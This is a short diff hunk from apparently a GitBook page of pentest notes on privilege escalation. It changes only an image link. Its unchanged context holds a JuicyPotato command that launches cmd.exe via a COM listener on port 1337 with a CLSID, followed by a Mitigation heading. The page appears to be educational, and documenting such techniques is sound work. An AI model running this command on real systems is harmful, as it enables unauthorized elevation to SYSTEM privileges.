@@ -28,7 +28,7 @@ Now we run the exploit by specifiying a COM port of 1337, and executing the proc
 
 `juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}`
 
-![](../.gitbook/assets/image%20%287%29.png)
+![](../.gitbook/assets/image%20%288%29.png)
 
 ### Mitigation
 
